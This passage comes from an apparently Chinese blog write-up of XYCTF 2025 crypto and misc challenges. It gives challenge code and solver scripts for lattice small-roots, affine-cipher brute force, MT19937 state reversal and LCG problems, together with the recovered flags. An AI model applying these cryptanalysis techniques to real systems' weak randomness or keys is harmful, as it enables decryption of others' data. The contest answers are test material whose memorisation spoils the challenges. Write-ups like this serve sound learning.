class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">mh = </span><br><span class="line">C = </span><br><span class="line">enc = <span class="string">b&#x27;\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe&#x27;</span></span><br><span class="line">mh_re, mh_im = mh</span><br><span class="line">PR.&lt;x,y&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">f = (mh_re + x)**<span class="number">3</span> - <span class="number">3</span>*(mh_re + x)*(mh_im + y)**<span class="number">2</span> - C[<span class="number">0</span>]</span><br><span class="line">res = small_roots(f, (<span class="number">2</span>^<span class="number">128</span>,<span class="number">2</span>^<span class="number">128</span>), m=<span class="number">2</span>, d=<span class="number">3</span>)</span><br><span class="line">m_re = mh_re + <span class="built_in">int</span>(res[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">m_im = mh_im + <span class="built_in">int</span>(res[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">flag = ChaCha20.new(key=hashlib.sha256(<span class="built_in">str</span>(m_re + m_im).encode()).digest(), nonce=<span class="string">b&#x27;Pr3d1ctmyxjj&#x27;</span>).decrypt(enc).decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># XYCTF&#123;Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge&#125;</span></span><br></pre></td></tr></table></figure><h2 id="reed"><a href="#reed" class="headerlink" title="reed"></a>reed</h2><blockquote><p>I’ve invented a new random number generation algorithm, and I believe it’s secure enough to withstand all known attacks!</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;XYCTF&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">flag = flag.rstrip(<span class="string">&#x27;&#125;&#x27;</span>).lstrip(<span class="string">&#x27;XYCTF&#123;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(i <span class="keyword">in</span> table <span class="keyword">for</span> i <span class="keyword">in</span> flag)</span><br><span class="line">r = random.Random()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PRNG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed</span>):</span><br><span class="line">        self.a = <span class="number">1145140</span></span><br><span class="line">        self.b = <span class="number">19198100</span></span><br><span class="line">        random.seed(seed)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        x = random.randint(self.a, self.b)</span><br><span class="line">        random.seed(x ** <span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">round</span>(<span class="params">self, k</span>):</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">            x = self.<span class="built_in">next</span>()</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg, a, b</span>):</span><br><span class="line">    c = [(a * table.index(m) + b) % <span class="number">19198111</span> <span class="keyword">for</span> m <span class="keyword">in</span> msg]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">seed = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;give me seed: &#x27;</span>))</span><br><span class="line">prng = PRNG(seed)</span><br><span class="line">a = prng.<span class="built_in">round</span>(r.randrange(<span class="number">2</span>**<span class="number">16</span>))</span><br><span class="line">b = prng.<span class="built_in">round</span>(r.randrange(<span class="number">2</span>**<span class="number">16</span>))</span><br><span class="line">enc = encrypt(flag, a, b)</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br></pre></td></tr></table></figure><p>怎么说呢，一开始看到<strong>随机数种子</strong>，以为可以搞搞随机数漏洞，发现其实并不是的</p><p>$c_{0}\equiv a<em>m_{0}+b\%p$<br>$c_{1}\equiv a</em>m_{1}+b\%p$<br>$a\equiv (c_{0}-c_{1})<em>(m_{0}-m_{1})^{-1}\%p$<br>$只要GCD(m_{0}-m_{1},p)=1，逆元即存在$<br>$b\equiv c_{0}-a</em>m_{0}\%p$<br>$只需要遍历table^{2}的空间即可，然后注意ab范围，seed随便输$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;39.106.48.123&quot;</span>, <span class="number">34301</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line">p = <span class="number">19198111</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, mod</span>):</span><br><span class="line">    g, x, y = egcd(a, mod)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % mod</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">enc</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, <span class="built_in">len</span>(enc)):</span><br><span class="line">            c0 = enc[i]</span><br><span class="line">            c1 = enc[j]</span><br><span class="line">            <span class="keyword">for</span> m0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">                <span class="keyword">for</span> m1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">                    <span class="keyword">if</span> m0 == m1:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    delta_m = m1 - m0</span><br><span class="line">                    delta_c = (c1 - c0) % p</span><br><span class="line">                    inv = modinv(delta_m, p)</span><br><span class="line">                    <span class="keyword">if</span> inv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    a = (delta_c * inv) % p</span><br><span class="line">                    b = (c0 - a * m0) % p</span><br><span class="line">                    <span class="comment"># Check if a and b are within PRNG&#x27;s output range</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">1145140</span> &lt;= a &lt;= <span class="number">19198100</span>):</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">1145140</span> &lt;= b &lt;= <span class="number">19198100</span>):</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    valid = <span class="literal">True</span></span><br><span class="line">                    decrypted = []</span><br><span class="line">                    <span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">                        numerator = (c - b) % p</span><br><span class="line">                        inv_a = modinv(a, p)</span><br><span class="line">                        <span class="keyword">if</span> inv_a <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                            valid = <span class="literal">False</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        m = (numerator * inv_a) % p</span><br><span class="line">                        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt;= m &lt; <span class="built_in">len</span>(table)):</span><br><span class="line">                            valid = <span class="literal">False</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        decrypted.append(table[m])</span><br><span class="line">                    <span class="keyword">if</span> valid:</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;解密失败&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;give me seed: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">114514</span>))</span><br><span class="line">enc = json.loads(io.recvline().decode())</span><br><span class="line">flag = decrypt(enc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的Flag:&quot;</span>, <span class="string">f&#x27;XYCTF&#123;&#123;<span class="subst">&#123;flag&#125;</span>&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment"># 解密后的Flag: XYCTF&#123;114514fixedpointissodangerous1919810&#125;</span></span><br></pre></td></tr></table></figure><h2 id="choice"><a href="#choice" class="headerlink" title="choice"></a>choice</h2><blockquote><p>Before we wrap up, here’s one last easy problem.</p></blockquote><p><code>random.py</code>说实话没什么用</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;XYCTF&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">flag = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">msg = bytes_to_long(flag)</span><br><span class="line">rand = Random()</span><br><span class="line">test = <span class="built_in">bytes</span>([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>, -<span class="number">1</span>, -<span class="number">1</span>)])</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;output.py&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">f&#x27;enc = <span class="subst">&#123;msg ^ rand.getrandbits(msg.bit_length())&#125;</span>\nr = <span class="subst">&#123;[rand.choice(test) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2496</span>)]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里还是<strong>MT19937</strong>，伪随机数算法的缺陷，<strong>2496*8=19968</strong>刚好够一轮<code>state</code>，注意到我们这里需要的是<strong>逆推</strong>上一个<code>state</code>(相当于反向预测吧)</p><p><img src="https://picx.zhimg.com/80/v2-4cd29979ffa498905e34d294cc0fc69a_1440w.png" alt=""><br>所以<code>r</code>需要取反处理一下</p><p>此处借鉴一下<strong>未央师傅</strong>的<code>exp</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># https://github.com/JuliaPoo/MT19937-Symbolic-Execution-and-Solver</span></span><br><span class="line">sys.path.append(<span class="string">&#x27;MT19937-Symbolic-Execution-and-Solver-master/source&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> MT19937 <span class="keyword">import</span> MT19937</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">enc = <span class="number">5042764371819053176884777909105310461303359296255297</span></span><br><span class="line">length = enc.bit_length()</span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line">r = []</span><br><span class="line">r = [<span class="number">255</span>-i <span class="keyword">for</span> i <span class="keyword">in</span> r]</span><br><span class="line">rng_clone = MT19937(state_from_data = (r, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getrandbits</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n//<span class="number">32</span>):</span><br><span class="line">        num = (rng_clone() &lt;&lt; (<span class="number">32</span> * i)) | num</span><br><span class="line">    num = rng_clone() &gt;&gt; (<span class="number">32</span> - (n % <span class="number">32</span>)) &lt;&lt; n//<span class="number">32</span>*<span class="number">32</span> | num</span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">rng_clone.reverse_states(length//<span class="number">32</span>+<span class="number">1</span>)  <span class="comment"># 回退到生成前n个随机数之前的状态</span></span><br><span class="line">flag = enc ^^ getrandbits(<span class="number">176</span>-<span class="number">1</span>)    <span class="comment"># 172/8=21.5,22*8=176,可能存在误差所以减1试试</span></span><br><span class="line">flag = <span class="string">b&#x27;XYCTF&#123;&#x27;</span>+long_to_bytes(flag)+<span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br><span class="line"><span class="comment"># XYCTF&#123;___0h_51mple_r@nd0m___&#125;</span></span><br></pre></td></tr></table></figure><h2 id="prng-xxxx"><a href="#prng-xxxx" class="headerlink" title="prng_xxxx*"></a>prng_xxxx*</h2><blockquote><p>Why is it called prng_xxxx?Well, to cut costs and improve efficiency, we “laid off” the LFSR. Of course, this means the PRNG now has to do a lot more work—so it’s getting way more salary! XDNote: You can check out prng_lfsr on <a href="https://tangcuxiaojikuai.xyz/post/cb7cb618.html">https://tangcuxiaojikuai.xyz/post/cb7cb618.html</a> for some inspiration.</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, b, seed</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed, a, b</span>):</span><br><span class="line">        self.seed = seed</span><br><span class="line">        self.a = a</span><br><span class="line">        self.b = b</span><br><span class="line">        self.m = <span class="number">2</span>**<span class="number">128</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.seed * self.a + self.b) % self.m</span><br><span class="line">        <span class="keyword">return</span> (self.seed &gt;&gt; <span class="number">64</span>) ^ (self.seed % <span class="number">2</span>**<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lfsr</span>:</span><br><span class="line">    <span class="comment"># 我被裁了/(ㄒoㄒ)/~~</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">47026247687942121848144207491837523525</span></span><br><span class="line"><span class="keyword">assert</span> b &lt; <span class="number">2</span>**<span class="number">128</span> <span class="keyword">and</span> seed &lt; <span class="number">2</span>**<span class="number">128</span></span><br><span class="line">lcg = LCG(seed, a, b)</span><br><span class="line"><span class="built_in">print</span>([lcg.<span class="built_in">next</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">0</span>] * <span class="number">64</span>])</span><br><span class="line"><span class="built_in">print</span>(AES.new(key=md5(<span class="built_in">str</span>(seed).encode()).digest(), mode=AES.MODE_ECB).encrypt(pad(flag, <span class="number">16</span>)))</span><br><span class="line"><span class="comment"># [17861431650111939539, 15632044669542972472, 18085804805519111109, 11630394250634164303, 10914687109985225138, 7348450425255618214, 10796029302647050328, 14267824433700366397, 9363967587530173835, 8995382728269798714, 3504283765121786984, 1312349325731613524, 10716889342831891752, 12298317818779713512, 8701992888199838445, 7261196699430834071, 4670657923849978944, 9833942603152121381, 18304734854303383637, 15945503654626665549, 6509330987395005461, 223169047706410182, 12990946817252956584, 3884858487227858459, 6366350447244638553, 10326924732676590049, 12989931141522347344, 9197940263960765675, 2481604167192102429, 1409946688030505107, 9263229900540161832, 266892958530212020, 14298569012977896930, 17318088100106133211, 4224045753426648494, 650161332435727275, 9488449142549049042, 8916910451165068139, 10116136382602356010, 6604992256480748513, 7375827593997920567, 1661095751967623288, 4143230452547340203, 4145435984742575053, 10465207027576409947, 16146447204594626029, 2807803679403346199, 10857432394281592897, 1494771564147200381, 2085795265418108023, 11756240132299985418, 13802520243518071455, 1191829597542202169, 16603089856395516862, 12517247819572559598, 14148806699104849454, 8174845389550768121, 15565523852832475714, 10046639095828632930, 15353735627107824646, 7003433641698461961, 11217699328913391211, 6392630836483027655, 7918524192972397836]</span></span><br><span class="line"><span class="comment"># b&#x27;l\x8bd,\xa3\xe7\x87*\xca\n\xd7\x11\xd6n=\xeaS`\xa4w\x94(\xb9\xf9\xb9\xc6\xe3\xc2\xfb\xdb\x80\xf6\x9f\xc7\xd1F&quot;`&#123;;V\xa7&#125;Z\xc0\xc0\xf6&lt;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒*"></a>勒索病毒*</h2><blockquote><p>帝皇坤在渗透的时候不小心运行了一个exe文件，然后重要文件被加密了，你能帮帮他吗</p></blockquote><p><code>flag.txt.enc</code>：<code>bf0cb5cc6bea6146e9c1f109df953a57daa416d38a8ffba6438e7e599613e01f3b9a53dace4ccd55cd3e55ef88e0b835</code></p><p>然后是个<strong>可执行程序</strong></p><h2 id="复复复复数"><a href="#复复复复数" class="headerlink" title="复复复复数*"></a>复复复复数*</h2><blockquote><p>天啊，这个复复复复数比我认识中的复数还多出了……？</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ComComplex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span>):</span><br><span class="line">        self.value = value</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="built_in">str</span>(self.value[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">for</span> k,i <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.value[<span class="number">1</span>:]):</span><br><span class="line">            <span class="keyword">if</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">                s += <span class="string">&#x27;+&#x27;</span></span><br><span class="line">            s += <span class="built_in">str</span>(i) +<span class="string">&#x27;ijk&#x27;</span>[k]</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__add__</span>(<span class="params">self,x</span>):</span><br><span class="line">        <span class="keyword">return</span> ComComplex([i+j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(self.value,x.value)])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self,x</span>):</span><br><span class="line">        a = self.value[<span class="number">0</span>]*x.value[<span class="number">0</span>]-self.value[<span class="number">1</span>]*x.value[<span class="number">1</span>]-self.value[<span class="number">2</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">3</span>]*x.value[<span class="number">3</span>]</span><br><span class="line">        b = self.value[<span class="number">0</span>]*x.value[<span class="number">1</span>]+self.value[<span class="number">1</span>]*x.value[<span class="number">0</span>]+self.value[<span class="number">2</span>]*x.value[<span class="number">3</span>]-self.value[<span class="number">3</span>]*x.value[<span class="number">2</span>]</span><br><span class="line">        c = self.value[<span class="number">0</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">1</span>]*x.value[<span class="number">3</span>]+self.value[<span class="number">2</span>]*x.value[<span class="number">0</span>]+self.value[<span class="number">3</span>]*x.value[<span class="number">1</span>]</span><br><span class="line">        d = self.value[<span class="number">0</span>]*x.value[<span class="number">3</span>]+self.value[<span class="number">1</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">2</span>]*x.value[<span class="number">1</span>]+self.value[<span class="number">3</span>]*x.value[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> ComComplex([a,b,c,d])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mod__</span>(<span class="params">self,x</span>):</span><br><span class="line">        <span class="keyword">return</span> ComComplex([i % x <span class="keyword">for</span> i <span class="keyword">in</span> self.value])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__pow__</span>(<span class="params">self, x, n=<span class="literal">None</span></span>):</span><br><span class="line">        tmp = ComComplex(self.value)</span><br><span class="line">        a = ComComplex([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">while</span> x:</span><br><span class="line">            <span class="keyword">if</span> x &amp; <span class="number">1</span>:</span><br><span class="line">                a *= tmp</span><br><span class="line">            tmp *= tmp</span><br><span class="line">            <span class="keyword">if</span> n:</span><br><span class="line">                a %= n</span><br><span class="line">                tmp %= n</span><br><span class="line">            x &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, hint</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line">r = getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q * r</span><br><span class="line"></span><br><span class="line">P = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(hint) == <span class="number">20</span></span><br><span class="line">hints = ComComplex([bytes_to_long(hint[i:i+<span class="number">5</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>,<span class="number">5</span>)])</span><br><span class="line">keys = ComComplex([<span class="number">0</span>, p, q, r])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hint =&#x27;</span>,hints)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;gift =&#x27;</span>,hints*keys%P)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;P =&#x27;</span>,P)</span><br><span class="line"></span><br><span class="line">e = <span class="number">65547</span></span><br><span class="line">m = ComComplex([bytes_to_long(flag[i:i+<span class="built_in">len</span>(flag)//<span class="number">4</span>+<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag),<span class="built_in">len</span>(flag)//<span class="number">4</span>+<span class="number">1</span>)])</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">hint = 375413371936+452903063925i+418564633198j+452841062207k</span></span><br><span class="line"><span class="string">gift = 8123312244520119413231609191866976836916616973013918670932199631084038015924368317077919454611785179950870055560079987034735836668109705445946887481003729+20508867471664499348708768798854433383217801696267611753941328714877299161068885700412171i+22802458968832151777449744120185122420871929971817937643641589637402679927558503881707868j+40224499597522456323122179021760594618350780974297095023316834212332206526399536884102863k</span></span><br><span class="line"><span class="string">P = 8123312244520119413231609191866976836916616973013918670932199631182724263362174895104545305364960781233690810077210539091362134310623408173268475389315109</span></span><br><span class="line"><span class="string">n = 408713495380933615345467409596399184629824932933932227692519320046890365817329617301604051766392980053993030281090124694858194866782889226223493799859404283664530068697313752856923001112586828837146686963124061670340088332769524367</span></span><br><span class="line"><span class="string">c = 212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103+24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825i+45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125j+96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385k</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p>后续这三题怕是不好复现了……</p><ul><li><a href="https://blog.weyung.cc/2025/04/04/2025%20XYCTF/#Crypto">未央师傅</a></li></ul><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="XGCTF"><a href="#XGCTF" class="headerlink" title="XGCTF"></a>XGCTF</h2><blockquote><p>2024年CTFshow举办了一场名为“西瓜杯”的比赛（XGCTF）。其中LamentXU在出题的时候，从某场比赛拉了道原题下来改了改，结果传文件的时候传错了传成原题了。因为这件事LamentXU的损友dragonkeep在他之前的博客上的原题wp上加了一段flag来嘲笑LamentXU。请你找到XGCTF中唯一由LamentXU出的题，并找出这题对应的原题，接着找到dragonkeep师傅的博客，并从博客上讲解该题的博文中找到flag。（hint：dragonkeep师傅因为比较穷买不起域名，因此他博客的域名在dragonkeep的基础上多了个字母）<br>（出题人：LamentXU）</p></blockquote><p>可以去<code>ctfshow</code>直接找<code>XGCTF</code>，看出题人出了哪道题目<br>然后，找<code>dragonkeep</code>师傅的博客，过程不细说，懂的自然懂，直接放<a href="https://dragonkeeep.top/category/CISCN%E5%8D%8E%E4%B8%9C%E5%8D%97WEB-Polluted">结果</a><br><img src="https://pic1.zhimg.com/80/v2-ba5e147c9715d7bf3e8e933b0510bdcb_1440w.png" alt=""><br><code>flag&#123;1t_I3_t3E_s@Me_ChAl1eNge_aT_a1L_P1e@se_fOrg1ve_Me&#125;</code></p><h2 id="签个到吧"><a href="#签个到吧" class="headerlink" title="签个到吧"></a>签个到吧</h2><blockquote><p>最小的，具有图灵完备性的语言是？</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span 